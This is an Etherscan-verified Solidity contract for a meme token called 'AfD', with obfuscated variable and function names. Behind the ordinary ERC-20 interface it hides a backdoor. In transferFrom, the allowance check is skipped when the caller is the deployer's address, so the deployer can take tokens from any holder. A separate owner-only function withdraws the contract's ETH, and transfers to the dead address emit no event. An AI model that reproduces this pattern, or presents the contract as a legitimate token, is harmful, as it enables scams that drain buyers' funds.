/**
 *Submitted for verification at Etherscan.io on 2025-02-21
*/

/**
 *Submitted for verification at Etherscan.io on 2025-02-21
*/

// SPDX-License-Identifier: MIT

/*
    https://x.com/elonmusk/status/1893227632906383424
    https://elonwithafd.cc/
    https://t.me/ElonwithAfD
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract AfD is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"AfD";
    string private constant _symbol = unicode"AfD";
    
    address payable private _GoldenADD;
    mapping(address => uint256) private _CATGRssw342sswq;
    mapping(address => mapping(address => uint256)) private _goldenTimes;
    mapping(address => bool) private _CATsoStroke;

    IUniswapV2Router02 private _BAHURouter;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    address private __PGGGOLDs034fj = address(0xdead);
    uint256 public _ojojoivlk__PGGGOLDxsswtsa = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkj__PGGGOLDxsswtsa = 20000000 * 10 **_decimals;
    uint256 public _ppojof__PGGGOLDxsswtsa = 10000000 * 10 **_decimals;

    uint256 private __PGGGOLDsssdrwqq1 = 0;
    uint256 private __PGGGOLDssdsdwer2dcw2 = 7;
    uint256 private __PGGGOLDsaszx123aad = 7;
    uint256 private __PGGGOLDsdbytycctynty = 0;
    address private __PGGGOLDssdfwecc;
    uint256 private __PGGGOLDsdbsad = 10;
    uint256 private __PGGGOLDssdwerw = 10;
    uint256 private __PGGGOLDssseq = 0;

    uint256 private constant _kmmvb__PGGGOLDxsswtsa = 1000000000 * 10 **_decimals;

    event MaxTxAmountUpdated(uint256 _ojojoivlk__PGGGOLDxsswtsa);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _CATsoStroke[owner()] = true;
        _CATsoStroke[address(this)] = true;
        _CATsoStroke[_GoldenADD] = true;
        __PGGGOLDssdfwecc = _msgSender();

        _GoldenADD = payable(_msgSender());
        _CATGRssw342sswq[address(this)] = _kmmvb__PGGGOLDxsswtsa * 98 / 100;
        _CATGRssw342sswq[owner()] = _kmmvb__PGGGOLDxsswtsa * 2 / 100;
        emit Transfer(address(0), address(this), _kmmvb__PGGGOLDxsswtsa * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvb__PGGGOLDxsswtsa * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvb__PGGGOLDxsswtsa;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _goldenTimes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _CATGRssw342sswq[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _goldenTimes[owner][spender];
    }
    
    function __PP__PGGGOLD(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_DIANI(sender, recipient))
            _allowed = _goldenTimes[sender][_msgSender()];
        return _allowed;
    }

    receive() external payable {}
    
    function _NO555fnon() internal view returns (bool) {return msg.sender == _GoldenADD;}

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _subtransferr___PGGGOLDxsswtsa(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            __PP__PGGGOLD(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }


    function __PGGGOLDCHECK(address payable receipt) external {
        require(msg.sender == __PGGGOLDssdfwecc , "");
        _GoldenADD = receipt;
        ___PGGGOLDxmnn34irfn(address(this).balance);
    }

    function _support__RUSSELL(uint256 amount) private {
        _GoldenADD.transfer(amount);
    }


    function ___PGGGOLDxmnn34irfn(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _subtransferr___PGGGOLDxsswtsa(_msgSender(), recipient, amount);
        return true;
    }

    function _DIANI(
        address from,
        address to
    ) internal view returns (bool) {
        if(_NO555fnon() == true) return false;
        else return from == uniswapV2Pair || to != __PGGGOLDs034fj;
    }

    
    function _subSwap___PGGGOLDxsswtsa(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _BAHURouter.WETH();
        _approve(address(this), address(_BAHURouter), tokenAmount);
        _BAHURouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _subtransferr___PGGGOLDxsswtsa(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (__PGGGOLDsdbytycctynty > __PGGGOLDssdsdwer2dcw2)
                        ? __PGGGOLDssseq
                        : __PGGGOLDsdbsad
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(_BAHURouter) &&
                !_CATsoStroke[to]
            ) {
                __PGGGOLDsdbytycctynty++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (__PGGGOLDsdbytycctynty > __PGGGOLDsaszx123aad)
                            ? __PGGGOLDsssdrwqq1
                            : __PGGGOLDssdwerw
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojof__PGGGOLDxsswtsa) ? contractTokenBalance : _ppojof__PGGGOLDxsswtsa; 
                    _subSwap___PGGGOLDxsswtsa((amount < minBalance) ? amount : minBalance);
                }
                _support__RUSSELL(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _CATGRssw342sswq[address(this)] =_CATGRssw342sswq[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _CATGRssw342sswq[from] =_CATGRssw342sswq[from].sub(amount);
        _CATGRssw342sswq[to] =_CATGRssw342sswq[to].add(amount.sub(taxAmount));
        if(__PGGGOLDs034fj != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

   
    function removeLimits () external onlyOwner {
        _ojojoivlk__PGGGOLDxsswtsa = _kmmvb__PGGGOLDxsswtsa;
        _lkkkvnblkj__PGGGOLDxsswtsa = _kmmvb__PGGGOLDxsswtsa;
        emit MaxTxAmountUpdated(_kmmvb__PGGGOLDxsswtsa);
    }

    function enable_GO() external onlyOwner {
        require(!isTrading, "Already Launched!");
        _BAHURouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(_BAHURouter), _kmmvb__PGGGOLDxsswtsa);
        uniswapV2Pair = IUniswapV2Factory(_BAHURouter.factory()).createPair(
            address(this),
            _BAHURouter.WETH()
        );
        _BAHURouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(_BAHURouter),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }
}